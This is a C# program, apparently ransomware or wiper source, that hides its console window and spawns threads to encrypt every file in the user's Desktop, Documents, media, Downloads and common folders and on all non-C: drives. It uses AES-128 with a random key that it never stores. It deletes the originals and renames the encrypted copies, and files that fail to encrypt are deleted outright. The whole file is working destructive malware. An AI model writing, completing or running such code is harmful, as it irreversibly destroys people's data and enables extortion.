using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace test
{
    public class Crypto(string PASSWORD)
    {
        private readonly string KEY = PASSWORD.Substring(0, 128 / 8);
        public byte[] AESEncrypt128(byte[] plainBytes)
        {

            RijndaelManaged rijndael = new RijndaelManaged();

            rijndael.Mode = CipherMode.CBC;

            rijndael.Padding = PaddingMode.PKCS7;

            rijndael.KeySize = 128;

            MemoryStream memoryStream = new MemoryStream();

            ICryptoTransform encryptor = rijndael.CreateEncryptor(Encoding.UTF8.GetBytes(KEY), Encoding.UTF8.GetBytes(KEY));

            CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write);
            cryptoStream.Write(plainBytes, 0, plainBytes.Length);
            cryptoStream.FlushFinalBlock();

            byte[] encryptBytes = memoryStream.ToArray();

            cryptoStream.Close();
            memoryStream.Close();

            return encryptBytes;
        }
        public string AESDecrypt128(string encrypt)
        {
            byte[] encryptBytes = Convert.FromBase64String(encrypt);

            RijndaelManaged rijndael = new RijndaelManaged();
            rijndael.Mode = CipherMode.CBC;
            rijndael.Padding = PaddingMode.PKCS7;
            rijndael.KeySize = 128;

            MemoryStream memoryStream = new MemoryStream(encryptBytes);
            ICryptoTransform decryptor = rijndael.CreateDecryptor(Encoding.UTF8.GetBytes(KEY), Encoding.UTF8.GetBytes(KEY));
            CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read);

            byte[] plainBytes = new byte[encryptBytes.Length];

            int plainCount = cryptoStream.Read(plainBytes, 0, plainBytes.Length);

            string plainString = Encoding.UTF8.GetString(plainBytes, 0, plainCount);

            cryptoStream.Close();
            memoryStream.Close();

            return plainString;
        }
    }
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        static void Main(string[] args) {
            ShowWindow(GetConsoleWindow(), 0);
            var characters = "BlackCompanyREDT";
            var Charsarr = new char[20];
            var random = new Random();
            for (int i = 0; i < Charsarr.Length; i++)
            {
                Charsarr[i] = characters[random.Next(characters.Length)];
            }
            var resultString = new String(Charsarr);
            Crypto cry = new Crypto(resultString);

            void en(DirectoryInfo dir)
            {
                foreach (FileInfo i in dir.GetFiles())
                {
                    try
                    {
                        var a = File.ReadAllBytes(dir.FullName + $"\\{i.Name}");
                        var c_a = cry.AESEncrypt128(a);
                        i.Delete();
                        File.WriteAllBytes(dir.FullName + $"\\{Convert.ToBase64String(Encoding.UTF8.GetBytes(i.Name))}", c_a);
                    }
                    catch(Exception e) { Console.WriteLine(e);
                        try
                        {
                            i.Delete();
                        }
                        catch (Exception e1)
                        {
                            Console.WriteLine(e1);
                        }
                    }
                }
                foreach (DirectoryInfo i in dir.GetDirectories())
                {
                    en(i);
                }
            }
            void go(System.Environment.SpecialFolder asaf)
            {
                try
                {
                    string path = Environment.GetFolderPath(asaf);
                    DirectoryInfo dir = new DirectoryInfo(path);
                    en(dir);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
            void go_e(string asaf)
            {
                try
                {
                    string path = asaf;
                    DirectoryInfo dir = new DirectoryInfo(path);
                    en(dir);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
            Thread go_MD = new Thread(() => go(Environment.SpecialFolder.Desktop));
            Thread go_MDC = new Thread(() => go(Environment.SpecialFolder.MyDocuments));
            Thread go_MM = new Thread(() => go(Environment.SpecialFolder.MyMusic));
            Thread go_MP = new Thread(() => go(Environment.SpecialFolder.MyPictures));
            Thread go_MV = new Thread(() => go(Environment.SpecialFolder.MyVideos));
            Thread go_CDD = new Thread(() => go(Environment.SpecialFolder.CommonDesktopDirectory));
            Thread go_CD = new Thread(() => go(Environment.SpecialFolder.CommonDocuments));
            Thread go_CM = new Thread(() => go(Environment.SpecialFolder.CommonMusic));
            Thread go_CP = new Thread(() => go(Environment.SpecialFolder.CommonPictures));
            Thread go_dl = new Thread(() => go_e(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Downloads"));
            go_MD.Start();
            go_MDC.Start();
            go_MM.Start();
            go_MP.Start();
            go_MV.Start();
            go_CDD.Start();
            go_CD.Start();
            go_CM.Start();
            go_CP.Start();
            go_dl.Start();
            DriveInfo[] a = DriveInfo.GetDrives();
            foreach (DriveInfo item in a)
            {
                if (item.Name == @"C:\"){ }
                else
                {
                    try
                    {
                        Thread godisk = new Thread(() => go_e(item.Name));
                        godisk.Start();
                        godisk.Join();
                    }
                    catch(Exception e) {Console.WriteLine(e.ToString()); }  
                }
            }
        }
    }
}